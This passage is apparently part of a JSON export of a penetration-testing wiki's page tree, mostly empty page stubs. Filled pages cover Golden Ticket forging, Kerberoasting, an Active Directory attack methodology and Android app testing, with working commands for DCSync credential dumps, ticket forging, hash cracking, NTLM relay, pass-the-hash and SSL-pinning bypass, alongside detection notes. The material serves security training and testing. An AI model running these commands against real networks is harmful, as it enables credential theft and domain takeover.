       "children": [],
       "tag": "TAG-0297",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "ASREPRoast",
       "slug": "asreproast",
       "type": "page",
       "children": [],
       "tag": "TAG-0298",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Badsuccessor Dmsa Migration Abuse",
       "slug": "badsuccessor-dmsa-migration-abuse",
       "type": "page",
       "children": [],
       "tag": "TAG-0299",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "BloodHound & Other AD Enum Tools",
       "slug": "bloodhound-other-ad-enum-tools",
       "type": "page",
       "children": [],
       "tag": "TAG-0300",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Constrained Delegation",
       "slug": "constrained-delegation",
       "type": "page",
       "children": [],
       "tag": "TAG-0301",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Custom SSP",
       "slug": "custom-ssp",
       "type": "page",
       "children": [],
       "tag": "TAG-0302",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "DCShadow",
       "slug": "dcshadow",
       "type": "page",
       "children": [],
       "tag": "TAG-0303",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "DCSync",
       "slug": "dcsync",
       "type": "page",
       "children": [],
       "tag": "TAG-0304",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Diamond Ticket",
       "slug": "diamond-ticket",
       "type": "page",
       "children": [],
       "tag": "TAG-0305",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "DSRM Credentials",
       "slug": "dsrm-credentials",
       "type": "page",
       "children": [],
       "tag": "TAG-0306",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "External Forest Domain - OneWay (Inbound) or bidirectional",
       "slug": "external-forest-domain---oneway-inbound-or-bidirectional",
       "type": "page",
       "children": [],
       "tag": "TAG-0307",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "External Forest Domain - One-Way (Outbound)",
       "slug": "external-forest-domain---one-way-outbound",
       "type": "page",
       "children": [],
       "tag": "TAG-0308",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Golden Dmsa Gmsa",
       "slug": "golden-dmsa-gmsa",
       "type": "page",
       "children": [],
       "tag": "TAG-0309",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Golden Ticket",
       "slug": "golden-ticket",
       "type": "page",
       "children": [],
       "tag": "TAG-0310",
       "content": "# Golden Ticket Attack\n\n## Concept\nThe `krbtgt` account's password hash signs *every* Kerberos TGT (Ticket Granting Ticket) in the domain. If you obtain that hash, you can forge a completely valid TGT for any user — including one that doesn't exist, with any group memberships you want, and any expiration date. This bypasses normal authentication entirely; the DC will accept the forged ticket as legitimate because it's correctly signed.\n\n## Requirements\n- The NTLM hash (or AES key) of the `krbtgt` account — typically obtained via DCSync rights or direct access to a Domain Controller's NTDS.dit.\n- The domain SID.\n\n## Obtaining the krbtgt Hash\n```bash\nsecretsdump.py domain.local/admin:pass@<dc-ip> -just-dc-user krbtgt\n# or via Mimikatz on a compromised DC\nlsadump::dcsync /user:domain\\krbtgt\n```\n\n## Forging the Ticket\n```bash\n# Impacket\nticketer.py -nthash <krbtgt-ntlm-hash> -domain-sid <domain-sid> -domain domain.local fakeuser\n\n# Mimikatz\nkerberos::golden /user:fakeuser /domain:domain.local /sid:<domain-sid> /krbtgt:<krbtgt-ntlm-hash> /ptt\n```\n\n## Using It\n```bash\nexport KRB5CCNAME=fakeuser.ccache\npsexec.py -k -no-pass domain.local/fakeuser@<target>\n```\n\n## Why It's So Dangerous\n- Works even after the compromised user account's password is changed (it doesn't rely on that account's credentials at all).\n- Only mitigated by rotating the `krbtgt` password itself — **twice**, since Kerberos keeps the previous password valid for a grace period, so a single reset alone doesn't invalidate existing golden tickets.\n- Can forge membership in *any* group, including Enterprise Admins, regardless of the fake account's real privileges.\n\n## Detection Awareness (for defensive reports)\n- Anomalous TGT lifetimes (default Golden Tickets are often set to unusually long validity, e.g. 10 years, by default tool settings — a dead giveaway if not customized).\n- TGT requests for user accounts that don't exist, or for accounts with logon activity inconsistent with their normal pattern.\n- Recommend: rotate `krbtgt` password twice on any suspected Golden Ticket compromise, monitor Event ID 4768/4769 for anomalies, and limit which accounts have DCSync-equivalent rights (`Replicating Directory Changes` / `Replicating Directory Changes All`).\n\n## Silver Ticket (Related, Quieter Alternative)\nForges a TGS (not a TGT) for a *specific service*, signed with that service account's hash instead of krbtgt's. Doesn't touch the DC at ticket-use time, making it stealthier but limited to the one service it was forged for.",
       "status": "complete",
       "updated": "2026-07-10"
      },
      {
       "title": "Kerberoast",
       "slug": "kerberoast",
       "type": "page",
       "children": [],
       "tag": "TAG-0311",
       "content": "# Kerberoasting\n\n## Concept\nAny authenticated domain user can request a Kerberos service ticket (TGS) for any account with a registered Service Principal Name (SPN). Part of that ticket is encrypted with the *service account's* password hash — so you can request it, take it offline, and crack it without touching the DC again or triggering a lockout.\n\n## Requirements\n- Any valid domain credential (even a low-privilege one).\n- Target accounts with an SPN set — usually service accounts, which are notorious for old, weak, rarely-rotated passwords.\n\n## Execution\n```bash\n# From Linux (Impacket)\nGetUserSPNs.py domain.local/user:pass -dc-ip <dc-ip> -request -outputfile hashes.txt\n\n# From Windows (PowerView)\nGet-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat\n```\n\n## Cracking\n```bash\nhashcat -m 13100 hashes.txt rockyou.txt      # RC4-encrypted tickets (etype 23) — fastest to crack\nhashcat -m 19600 hashes.txt rockyou.txt      # AES128 tickets\nhashcat -m 19700 hashes.txt rockyou.txt      # AES256 tickets — slower, but still crackable if the password is weak\n```\nRC4 tickets crack dramatically faster than AES ones — if you can choose, or if `msDS-SupportedEncryptionTypes` allows it, RC4-based tickets are the highest-value targets.\n\n## Prioritizing Targets\n- Check `Get-DomainUser -SPN` output for accounts with **high privilege** (nested in admin groups) — a Kerberoastable service account that's also a Domain Admin is the single highest-value target you can find in this phase.\n- Old accounts with `pwdLastSet` far in the past are statistically far more likely to have weak/never-rotated passwords.\n\n## Targeted Kerberoasting (Stealthier)\nInstead of requesting tickets for every SPN account (noisy, triggers Event ID 4769 in bulk), target only the specific accounts BloodHound flagged as high-value.\n\n## Detection Awareness (for defensive reports)\n- Event ID 4769 with encryption type 0x17 (RC4) requested by an unusual account, in unusual volume, is the classic detection signature.\n- Recommend: enforce AES-only encryption on service accounts, use Managed Service Accounts (gMSA) with auto-rotated 120+ character passwords, and monitor for bulk TGS requests.",
       "status": "complete",
       "updated": "2026-07-10"
      },
      {
       "title": "Kerberos Authentication",
       "slug": "kerberos-authentication",
       "type": "page",
       "children": [],
       "tag": "TAG-0312",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Kerberos Double Hop Problem",
       "slug": "kerberos-double-hop-problem",
       "type": "page",
       "children": [],
       "tag": "TAG-0313",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Lansweeper Security",
       "slug": "lansweeper-security",
       "type": "page",
       "children": [],
       "tag": "TAG-0314",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "LAPS",
       "slug": "laps",
       "type": "page",
       "children": [],
       "tag": "TAG-0315",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "MSSQL AD Abuse",
       "slug": "mssql-ad-abuse",
       "type": "page",
       "children": [],
       "tag": "TAG-0316",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Ldap Signing And Channel Binding",
       "slug": "ldap-signing-and-channel-binding",
       "type": "page",
       "children": [],
       "tag": "TAG-0317",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Over Pass the Hash/Pass the Key",
       "slug": "over-pass-the-hashpass-the-key",
       "type": "page",
       "children": [],
       "tag": "TAG-0318",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Pass the Ticket",
       "slug": "pass-the-ticket",
       "type": "page",
       "children": [],
       "tag": "TAG-0319",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Password Spraying / Brute Force",
       "slug": "password-spraying-brute-force",
       "type": "page",
       "children": [],
       "tag": "TAG-0320",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "PrintNightmare",
       "slug": "printnightmare",
       "type": "page",
       "children": [],
       "tag": "TAG-0321",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Force NTLM Privileged Authentication",
       "slug": "force-ntlm-privileged-authentication",
       "type": "page",
       "children": [],
       "tag": "TAG-0322",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Privileged Groups",
       "slug": "privileged-groups",
       "type": "page",
       "children": [],
       "tag": "TAG-0323",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "RDP Sessions Abuse",
       "slug": "rdp-sessions-abuse",
       "type": "page",
       "children": [],
       "tag": "TAG-0324",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Resource-based Constrained Delegation",
       "slug": "resource-based-constrained-delegation",
       "type": "page",
       "children": [],
       "tag": "TAG-0325",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Sccm Management Point Relay Sql Policy Secrets",
       "slug": "sccm-management-point-relay-sql-policy-secrets",
       "type": "page",
       "children": [],
       "tag": "TAG-0326",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Security Descriptors",
       "slug": "security-descriptors",
       "type": "page",
       "children": [],
       "tag": "TAG-0327",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "SID-History Injection",
       "slug": "sid-history-injection",
       "type": "page",
       "children": [],
       "tag": "TAG-0328",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Silver Ticket",
       "slug": "silver-ticket",
       "type": "page",
       "children": [],
       "tag": "TAG-0329",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Skeleton Key",
       "slug": "skeleton-key",
       "type": "page",
       "children": [],
       "tag": "TAG-0330",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Timeroasting",
       "slug": "timeroasting",
       "type": "page",
       "children": [],
       "tag": "TAG-0331",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Unconstrained Delegation",
       "slug": "unconstrained-delegation",
       "type": "page",
       "children": [],
       "tag": "TAG-0332",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0284",
     "content": "# Active Directory Pentesting Methodology\n\n## Initial Enumeration (No Creds / Low-Priv)\n```bash\n# Null session / anonymous checks (rare on modern DCs, still worth trying)\ncrackmapexec smb <dc-ip> -u '' -p ''\n# LDAP anonymous bind\nldapsearch -x -H ldap://<dc-ip> -b \"dc=domain,dc=local\"\n```\n\n## With Valid Low-Privilege Creds\n```bash\ncrackmapexec smb <dc-ip> -u user -p pass --users\ncrackmapexec smb <dc-ip> -u user -p pass --groups\nbloodhound-python -u user -p pass -d domain.local -ns <dc-ip> -c All\n```\nFeed BloodHound's output into the GUI — it's the fastest way to visually spot attack paths (e.g., a low-priv user with `GenericAll` on a group that's nested into Domain Admins).\n\n## Key Attack Paths to Check\n| Technique | What it needs | What it gets you |\n|---|---|---|\n| Kerberoasting | Any domain account | Crackable service account password hashes |\n| AS-REP Roasting | Accounts with \"Do not require Kerberos preauth\" set | Crackable hash without needing a password first |\n| ACL abuse (GenericAll/WriteDACL/etc.) | Any account with a misconfigured ACE | Ability to reset passwords, add to groups, or take over objects |\n| Unconstrained delegation | A compromised host with unconstrained delegation | Capture a DC's TGT when it authenticates to that host |\n| GPO abuse | Write access to a GPO | Push a malicious scheduled task/script to every machine that GPO applies to |\n| LLMNR/NBT-NS poisoning | Network position (any authenticated host) | Capture NetNTLM hashes for offline cracking or relay |\n\n## LLMNR/NBT-NS Poisoning + Relay\n```bash\nresponder -I eth0 -wrf\n# If SMB signing is disabled on targets, relay instead of just capturing:\nntlmrelayx.py -tf targets.txt -smb2support\n```\n\n## Kerberoasting\n```bash\nGetUserSPNs.py domain.local/user:pass -dc-ip <dc-ip> -request\nhashcat -m 13100 hashes.txt rockyou.txt\n```\n\n## Dumping Credentials Post-Compromise\n```bash\nsecretsdump.py domain.local/admin:pass@<dc-ip>              # remote SAM/NTDS dump if DA\nmimikatz # lsadump::dcsync /user:domain\\krbtgt                # DCSync if you have replication rights\n```\n\n## Lateral Movement\n```bash\ncrackmapexec smb <target> -u admin -H <ntlm-hash>            # pass-the-hash\nwmiexec.py domain.local/admin@<target> -hashes :<ntlm-hash>\nevil-winrm -i <target> -u admin -H <ntlm-hash>\n```\n\n## Persistence (only within authorized scope)\n- Golden Ticket (forge TGTs using the `krbtgt` hash — survives password changes on individual accounts).\n- Silver Ticket (forge a TGS for a specific service using that service account's hash — quieter, doesn't touch the DC).\n- DCSync rights granted to a compromised low-priv account (subtle, blends into normal replication traffic).\n\n## Practical Order of Operations\n1. Enumerate with BloodHound as early as possible — it directs everything after.\n2. Try Kerberoasting/AS-REP roasting immediately — free, no elevated access needed.\n3. Check for LLMNR/NBT-NS poisoning opportunities in parallel.\n4. Follow whatever BloodHound attack path is shortest to Domain Admin.\n5. Once DA, DCSync for full credential dump, then assess actual business impact — not just \"I got DA.\"",
     "status": "complete",
     "updated": "2026-07-10"
    },
    {
     "title": "Windows Security Controls",
     "slug": "windows-security-controls",
     "type": "page",
     "children": [
      {
       "title": "UAC - User Account Control",
       "slug": "uac---user-account-control",
       "type": "page",
       "children": [],
       "tag": "TAG-0334",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0333",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "NTLM",
     "slug": "ntlm",
     "type": "page",
     "children": [
      {
       "title": "Places to steal NTLM creds",
       "slug": "places-to-steal-ntlm-creds",
       "type": "page",
       "children": [],
       "tag": "TAG-0336",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0335",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Lateral Movement",
     "slug": "lateral-movement",
     "type": "page",
     "children": [
      {
       "title": "AtExec / SchtasksExec",
       "slug": "atexec-schtasksexec",
       "type": "page",
       "children": [],
       "tag": "TAG-0338",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "DCOM Exec",
       "slug": "dcom-exec",
       "type": "page",
       "children": [],
       "tag": "TAG-0339",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "PsExec/Winexec/ScExec",
       "slug": "psexecwinexecscexec",
       "type": "page",
       "children": [],
       "tag": "TAG-0340",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "RDPexec",
       "slug": "rdpexec",
       "type": "page",
       "children": [],
       "tag": "TAG-0341",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "SCMexec",
       "slug": "scmexec",
       "type": "page",
       "children": [],
       "tag": "TAG-0342",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "WinRM",
       "slug": "winrm",
       "type": "page",
       "children": [],
       "tag": "TAG-0343",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "WmiExec",
       "slug": "wmiexec",
       "type": "page",
       "children": [],
       "tag": "TAG-0344",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0337",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Pivoting to the Cloud",
     "slug": "pivoting-to-the-cloud",
     "type": "page",
     "children": [],
     "tag": "TAG-0345",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Stealing Windows Credentials",
     "slug": "stealing-windows-credentials",
     "type": "page",
     "children": [
      {
       "title": "Windows Credentials Protections",
       "slug": "windows-credentials-protections",
       "type": "page",
       "children": [],
       "tag": "TAG-0347",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Mimikatz",
       "slug": "mimikatz",
       "type": "page",
       "children": [],
       "tag": "TAG-0348",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "WTS Impersonator",
       "slug": "wts-impersonator",
       "type": "page",
       "children": [],
       "tag": "TAG-0349",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Windows Registry Hive Exploitation",
       "slug": "windows-registry-hive-exploitation",
       "type": "page",
       "children": [],
       "tag": "TAG-0350",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0346",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Basic Win CMD for Pentesters",
     "slug": "basic-win-cmd-for-pentesters",
     "type": "page",
     "children": [],
     "tag": "TAG-0351",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Basic PowerShell for Pentesters",
     "slug": "basic-powershell-for-pentesters",
     "type": "page",
     "children": [
      {
       "title": "PowerView/SharpView",
       "slug": "powerviewsharpview",
       "type": "page",
       "children": [],
       "tag": "TAG-0353",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0352",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Antivirus (AV) Bypass",
     "slug": "antivirus-av-bypass",
     "type": "page",
     "children": [],
     "tag": "TAG-0354",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Cobalt Strike",
     "slug": "cobalt-strike",
     "type": "page",
     "children": [],
     "tag": "TAG-0355",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Mythic",
     "slug": "mythic",
     "type": "page",
     "children": [],
     "tag": "TAG-0356",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Protocol Handler Shell Execute Abuse",
     "slug": "protocol-handler-shell-execute-abuse",
     "type": "page",
     "children": [],
     "tag": "TAG-0357",
     "content": "",
     "status": "empty",
     "updated": null
    }
   ],
   "color": "#4FA6E8"
  },
  {
   "title": "📱 Mobile Pentesting",
   "slug": "mobile-pentesting",
   "type": "category",
   "children": [
    {
     "title": "Android APK Checklist",
     "slug": "android-apk-checklist",
     "type": "page",
     "children": [],
     "tag": "TAG-0358",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "Android Applications Pentesting",
     "slug": "android-applications-pentesting",
     "type": "page",
     "children": [
      {
       "title": "Abusing Android Media Pipelines Image Parsers",
       "slug": "abusing-android-media-pipelines-image-parsers",
       "type": "page",
       "children": [],
       "tag": "TAG-0360",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Accessibility Services Abuse",
       "slug": "accessibility-services-abuse",
       "type": "page",
       "children": [],
       "tag": "TAG-0361",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Android Anti Instrumentation And Ssl Pinning Bypass",
       "slug": "android-anti-instrumentation-and-ssl-pinning-bypass",
       "type": "page",
       "children": [],
       "tag": "TAG-0362",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Android Application Level Virtualization",
       "slug": "android-application-level-virtualization",
       "type": "page",
       "children": [],
       "tag": "TAG-0363",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Android Applications Basics",
       "slug": "android-applications-basics",
       "type": "page",
       "children": [],
       "tag": "TAG-0364",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Android Enterprise Work Profile Bypass",
       "slug": "android-enterprise-work-profile-bypass",
       "type": "page",
       "children": [],
       "tag": "TAG-0365",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Android Hce Nfc Emv Relay Attacks",
       "slug": "android-hce-nfc-emv-relay-attacks",
       "type": "page",
       "children": [],
       "tag": "TAG-0366",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Android Physical Attacks",
       "slug": "android-physical-attacks",
       "type": "page",
       "children": [],
       "tag": "TAG-0367",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Android Task Hijacking",
       "slug": "android-task-hijacking",
       "type": "page",
       "children": [],
       "tag": "TAG-0368",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Android VPN Bypass",
       "slug": "android-vpn-bypass",
       "type": "page",
       "children": [],
       "tag": "TAG-0369",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "ADB Commands",
       "slug": "adb-commands",
       "type": "page",
       "children": [],
       "tag": "TAG-0370",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "APK decompilers",
       "slug": "apk-decompilers",
       "type": "page",
       "children": [],
       "tag": "TAG-0371",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "AVD - Android Virtual Device",
       "slug": "avd---android-virtual-device",
       "type": "page",
       "children": [],
       "tag": "TAG-0372",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Bypass Biometric Authentication (Android)",
       "slug": "bypass-biometric-authentication-android",
       "type": "page",
       "children": [],
       "tag": "TAG-0373",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "content:// protocol",
       "slug": "content-protocol",
       "type": "page",
       "children": [],
       "tag": "TAG-0374",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Drozer Tutorial",
       "slug": "drozer-tutorial",
       "type": "page",
       "children": [
        {
         "title": "Exploiting Content Providers",
         "slug": "exploiting-content-providers",
         "type": "page",
         "children": [],
         "tag": "TAG-0376",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0375",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Exploiting a debuggeable application",
       "slug": "exploiting-a-debuggeable-application",
       "type": "page",
       "children": [],
       "tag": "TAG-0377",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Firmware Level Zygote Backdoor Libandroid Runtime",
       "slug": "firmware-level-zygote-backdoor-libandroid-runtime",
       "type": "page",
       "children": [],
       "tag": "TAG-0378",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Flutter",
       "slug": "flutter",
       "type": "page",
       "children": [],
       "tag": "TAG-0379",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Frida Tutorial",
       "slug": "frida-tutorial",
       "type": "page",
       "children": [
        {
         "title": "Frida Tutorial 1",
         "slug": "frida-tutorial-1",
         "type": "page",
         "children": [],
         "tag": "TAG-0381",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "Frida Tutorial 2",
         "slug": "frida-tutorial-2",
         "type": "page",
         "children": [],
         "tag": "TAG-0382",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "Frida Tutorial 3",
         "slug": "frida-tutorial-3",
         "type": "page",
         "children": [],
         "tag": "TAG-0383",
         "content": "",
         "status": "empty",
         "updated": null
        },
        {
         "title": "Objection Tutorial",
         "slug": "objection-tutorial",
         "type": "page",
         "children": [],
         "tag": "TAG-0384",
         "content": "",
         "status": "empty",
         "updated": null
        }
       ],
       "tag": "TAG-0380",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Google CTF 2018 - Shall We Play a Game?",
       "slug": "google-ctf-2018---shall-we-play-a-game",
       "type": "page",
       "children": [],
       "tag": "TAG-0385",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "In Memory Jni Shellcode Execution",
       "slug": "in-memory-jni-shellcode-execution",
       "type": "page",
       "children": [],
       "tag": "TAG-0386",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Inputmethodservice Ime Abuse",
       "slug": "inputmethodservice-ime-abuse",
       "type": "page",
       "children": [],
       "tag": "TAG-0387",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Insecure In App Update Rce",
       "slug": "insecure-in-app-update-rce",
       "type": "page",
       "children": [],
       "tag": "TAG-0388",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Install Burp Certificate",
       "slug": "install-burp-certificate",
       "type": "page",
       "children": [],
       "tag": "TAG-0389",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Intent Injection",
       "slug": "intent-injection",
       "type": "page",
       "children": [],
       "tag": "TAG-0390",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Make APK Accept CA Certificate",
       "slug": "make-apk-accept-ca-certificate",
       "type": "page",
       "children": [],
       "tag": "TAG-0391",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Manual DeObfuscation",
       "slug": "manual-deobfuscation",
       "type": "page",
       "children": [],
       "tag": "TAG-0392",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Play Integrity Attestation Bypass",
       "slug": "play-integrity-attestation-bypass",
       "type": "page",
       "children": [],
       "tag": "TAG-0393",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "React Native Application",
       "slug": "react-native-application",
       "type": "page",
       "children": [],
       "tag": "TAG-0394",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Reversing Native Libraries",
       "slug": "reversing-native-libraries",
       "type": "page",
       "children": [],
       "tag": "TAG-0395",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Shizuku Privileged Api",
       "slug": "shizuku-privileged-api",
       "type": "page",
       "children": [],
       "tag": "TAG-0396",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Smali - Decompiling, Modifying, Compiling",
       "slug": "smali---decompiling-modifying-compiling",
       "type": "page",
       "children": [],
       "tag": "TAG-0397",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Spoofing your location in Play Store",
       "slug": "spoofing-your-location-in-play-store",
       "type": "page",
       "children": [],
       "tag": "TAG-0398",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Tapjacking",
       "slug": "tapjacking",
       "type": "page",
       "children": [],
       "tag": "TAG-0399",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "Webview Attacks",
       "slug": "webview-attacks",
       "type": "page",
       "children": [],
       "tag": "TAG-0400",
       "content": "",
       "status": "empty",
       "updated": null
      }
     ],
     "tag": "TAG-0359",
     "content": "# Android Application Pentesting\n\n## Environment Setup\n- Rooted emulator (Genymotion/AVD with root image) or rooted physical device.\n- Proxy traffic through Burp: install Burp's CA cert as a system trust anchor (required for Android 7+, since user certs aren't trusted by default for apps targeting API 24+).\n- `frida-server` running on device, matched architecture, for runtime instrumentation.\n\n## Static Analysis\n```bash\napktool d app.apk -o app_decoded          # decompile resources + smali\njadx-gui app.apk                           # decompiled Java source, much more readable\n```\nLook in `AndroidManifest.xml` for:\n- Exported components (`exported=\"true\"`) — activities/services/receivers reachable by other apps.\n- `android:debuggable=\"true\"` left in a release build.\n- `android:allowBackup=\"true\"` — app data extractable via `adb backup` without root.\n- Permissions requested vs actually needed (over-permissioning).\n\n## Common Vulnerability Classes\n| Class | What to check |\n|---|---|\n| Insecure data storage | SharedPreferences, SQLite DBs, or files stored unencrypted in app-private or external storage |\n| Insecure communication | Missing/weak certificate pinning, cleartext traffic allowed (`usesCleartextTraffic`) |\n| Exported components | Launch exported activities directly via `adb shell am start -n package/.Activity` to bypass intended flow |\n| WebView issues | `addJavascriptInterface` exposing native methods to JS, `setAllowFileAccess(true)` combined with loading untrusted content |\n| Hardcoded secrets | API keys/credentials in decompiled source or `strings.xml` |\n| Root/debug detection bypass | Frida hooks to patch out `isDebuggerConnected()`/root-check functions |\n\n## Runtime Instrumentation (Frida)\n```bash\nfrida -U -f com.target.app -l bypass-ssl-pinning.js --no-pause\nfrida-trace -U -f com.target.app -j \"*!*Crypto*\"    # trace crypto API usage\n```\n\n## Traffic Interception When Pinning Is Present\n- Patch the APK with `objection` or a Frida SSL-unpinning script, or use `apk-mitm` to auto-patch network security config.\n```bash\nobjection -g com.target.app explore\nandroid sslpinning disable\n```\n\n## Data-at-Rest Extraction (rooted device)\n```bash\nadb shell\nrun-as com.target.app\ncd /data/data/com.target.app\nfind . -name \"*.db\" -o -name \"*.xml\"\n```",
     "status": "complete",
     "updated": "2026-07-10"
    },
    {
     "title": "iOS Pentesting Checklist",
     "slug": "ios-pentesting-checklist",
     "type": "page",
     "children": [],
     "tag": "TAG-0401",
     "content": "",
     "status": "empty",
     "updated": null
    },
    {
     "title": "iOS Pentesting",
     "slug": "ios-pentesting",
     "type": "page",
     "children": [
      {
       "title": "Air Keyboard Remote Input Injection",
       "slug": "air-keyboard-remote-input-injection",
       "type": "page",
       "children": [],
       "tag": "TAG-0403",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "iOS App Extensions",
       "slug": "ios-app-extensions",
       "type": "page",
       "children": [],
       "tag": "TAG-0404",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "iOS Basics",
       "slug": "ios-basics",
       "type": "page",
       "children": [],
       "tag": "TAG-0405",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "iOS Basic Testing Operations",
       "slug": "ios-basic-testing-operations",
       "type": "page",
       "children": [],
       "tag": "TAG-0406",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "iOS Burp Suite Configuration",
       "slug": "ios-burp-suite-configuration",
       "type": "page",
       "children": [],
       "tag": "TAG-0407",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "iOS Custom URI Handlers / Deeplinks / Custom Schemes",
       "slug": "ios-custom-uri-handlers-deeplinks-custom-schemes",
       "type": "page",
       "children": [],
       "tag": "TAG-0408",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "iOS Extracting Entitlements From Compiled Application",
       "slug": "ios-extracting-entitlements-from-compiled-application",
       "type": "page",
       "children": [],
       "tag": "TAG-0409",
       "content": "",
       "status": "empty",
       "updated": null
      },
      {
       "title": "iOS Frida Configuration",
